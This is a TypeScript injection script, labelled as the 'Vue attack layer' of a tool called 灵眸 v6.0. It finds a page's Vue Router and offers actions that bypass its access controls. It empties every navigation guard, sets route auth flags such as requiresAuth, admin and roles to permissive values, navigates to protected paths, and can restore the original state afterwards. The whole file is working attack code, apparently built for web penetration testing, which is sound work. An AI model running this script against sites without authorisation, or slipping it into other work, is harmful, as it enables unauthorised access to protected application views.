/**
 * Vue 攻击层注入脚本 — 灵眸 v6.0
 * MAIN world 运行，操作 Vue Router 运行时：
 *   - bypass: 清空所有导航守卫 + 禁用路由 auth meta（备份可恢复）
 *   - disableAuth: 仅禁用路由 auth meta，不清空守卫（备份可恢复）
 *   - navigate: router.push 到指定路径
 *   - jump: 一键绕过 + 导航 + 3 秒后自动恢复
 *   - restore: 还原守卫和 auth meta
 *
 * 通过 dataset.vkToken 读取一次性令牌，postMessage 回传结果。
 */
(function () {
  const token: string = document.currentScript
    ? (document.currentScript as HTMLScriptElement).dataset.vkToken || ''
    : '';
  const action: string = document.currentScript
    ? (document.currentScript as HTMLScriptElement).dataset.vkAction || ''
    : '';
  const target: string = document.currentScript
    ? (document.currentScript as HTMLScriptElement).dataset.vkTarget || ''
    : '';

  const AUTH_KEYS = [
    'requiresAuth', 'requireAuth', 'auth', 'requireRole', 'requireAuthRole',
    'permission', 'permissions', 'role', 'roles', 'admin', 'isAdmin',
    'authority', 'access', 'whiteList', 'noAuth', 'loginRequired',
  ];

  function postResult(result: any) {
    window.postMessage({ __vk_vue_attack: true, __vk_token: token, result }, location.origin);
  }

  /** 解析 Vue 实例（Vue 2/3）与 router */
  function resolveVue(): { app: any; router: any; isVue3: boolean } | null {
    const roots = [
      document.getElementById('app'),
      document.querySelector('[data-v-app]'),
      document.getElementById('root'),
      document.getElementById('__nuxt'),
    ].filter(Boolean) as HTMLElement[];

    for (const el of (roots as HTMLElement[])) {
      const app = (el as any).__vue_app__ || (el as any).__vue__;
      if (app) {
        const isVue3 = !!(app as any).config;
        const router = isVue3 ? app.config.globalProperties.$router : app.$router;
        if (router) return { app, router, isVue3 };
      }
    }
    // BFS 兜底
    const queue: HTMLElement[] = [document.body as HTMLElement];
    let n = 0;
    while (queue.length && n < 1000) {
      const el = queue.shift()!;
      n++;
      const app = (el as any).__vue_app__ || (el as any).__vue__;
      if (app) {
        const isVue3 = !!(app as any).config;
        const router = isVue3 ? app.config.globalProperties.$router : app.$router;
        if (router) return { app, router, isVue3 };
      }
      for (let i = 0; i < el.children.length; i++) queue.push(el.children[i] as HTMLElement);
    }
    return null;
  }

  function clearGuards(router: any): Record<string, number> {
    const backup: Record<string, number> = {};
    const guardArrays = [
      'beforeGuards', 'afterGuards', 'beforeResolveGuards',
      'beforeHooks', 'afterHooks', 'beforeResolveHooks',
    ];
    for (const k of guardArrays) {
      if (Array.isArray(router[k])) {
        backup[k] = router[k].length;
        (window as any).__vk_vue_backup_guards = (window as any).__vk_vue_backup_guards || {};
        (window as any).__vk_vue_backup_guards[k] = router[k].slice();
        router[k].length = 0;
      }
    }
    return backup;
  }

  function disableRouteAuth(routes: any[]): number {
    let count = 0;
    const walk = (list: any[]) => {
      for (const r of list || []) {
        if (r && r.meta && typeof r.meta === 'object') {
          (window as any).__vk_vue_backup_meta = (window as any).__vk_vue_backup_meta || new Map();
          if (!(window as any).__vk_vue_backup_meta.has(r)) {
            (window as any).__vk_vue_backup_meta.set(r, { ...r.meta });
          }
          for (const k of AUTH_KEYS) {
            if (k in r.meta) {
              if (k === 'noAuth') { r.meta[k] = true; }      // noAuth=true 表示放行
              else { r.meta[k] = false; }                    // requiresAuth/admin 等=false 放行
              count++;
            }
          }
        }
        if (r && r.children) walk(r.children);
      }
    };
    walk(routes);
    return count;
  }

  function restore(router: any) {
    const backup = (window as any).__vk_vue_backup_guards;
    if (backup) {
      for (const k of Object.keys(backup)) {
        if (Array.isArray(router[k])) {
          router[k].length = 0;
          router[k].push(...backup[k]);
        }
      }
    }
    const metaBackup = (window as any).__vk_vue_backup_meta;
    if (metaBackup && router.options && router.options.routes) {
      const walk = (list: any[]) => {
        for (const r of list || []) {
          if (metaBackup.has(r)) {
            Object.keys(r.meta || {}).forEach((k) => delete r.meta[k]);
            Object.assign(r.meta || (r.meta = {}), metaBackup.get(r));
          }
          if (r && r.children) walk(r.children);
        }
      };
      walk(router.options.routes);
    }
    (window as any).__vk_vue_backup_guards = null;
    (window as any).__vk_vue_backup_meta = null;
  }

  try {
    const resolved = resolveVue();
    if (!resolved) {
      postResult({ success: false, error: '未检测到 Vue Router' });
      return;
    }
    const { router } = resolved;

    if (action === 'bypass') {
      const guardBackup = clearGuards(router);
      // 禁用 routes（含 options.routes 和 matcher 中的记录）的 auth meta
      let disabled = 0;
      const routeSources: any[][] = [];
      if (router.options && router.options.routes) routeSources.push(router.options.routes);
      if (typeof router.getRoutes === 'function') {
        const flat = router.getRoutes();
        if (Array.isArray(flat)) routeSources.push(flat);
      }
      for (const src of routeSources) disabled += disableRouteAuth(src);
      postResult({ success: true, guards: guardBackup, disabledMeta: disabled });
      return;
    }

    if (action === 'disableAuth') {
      // 仅禁用路由 auth meta，不清空守卫
      let disabled = 0;
      const routeSources: any[][] = [];
      if (router.options && router.options.routes) routeSources.push(router.options.routes);
      if (typeof router.getRoutes === 'function') {
        const flat = router.getRoutes();
        if (Array.isArray(flat)) routeSources.push(flat);
      }
      for (const src of routeSources) disabled += disableRouteAuth(src);
      postResult({ success: true, disabledMeta: disabled });
      return;
    }

    if (action === 'jump') {
      // 一键绕过 + 导航 + 自动恢复
      clearGuards(router);
      const routeSources: any[][] = [];
      if (router.options && router.options.routes) routeSources.push(router.options.routes);
      if (typeof router.getRoutes === 'function') {
        const flat = router.getRoutes();
        if (Array.isArray(flat)) routeSources.push(flat);
      }
      for (const src of routeSources) disableRouteAuth(src);
      router.push(target).then(
        () => {
          postResult({ success: true, path: target });
          // 导航完成后自动恢复守卫
          setTimeout(() => {
            restore(router);
            window.postMessage({ __vk_vue_attack: true, __vk_token: token, result: { success: true, autoRestored: true } }, location.origin);
          }, 3000);
        },
        (e: any) => {
          postResult({ success: false, error: String(e && e.message ? e.message : e) });
          restore(router);
        },
      );
      return;
    }

    if (action === 'navigate') {
      if (!target) {
        postResult({ success: false, error: '缺少目标路径' });
        return;
      }
      router.push(target).then(
        () => postResult({ success: true, path: target }),
        (e: any) => postResult({ success: false, error: String(e && e.message ? e.message : e) }),
      );
      return;
    }

    if (action === 'restore') {
      restore(router);
      postResult({ success: true });
      return;
    }

    postResult({ success: false, error: '未知操作: ' + action });
  } catch (e: any) {
    postResult({ success: false, error: String(e && e.message ? e.message : e) });
  }
})();
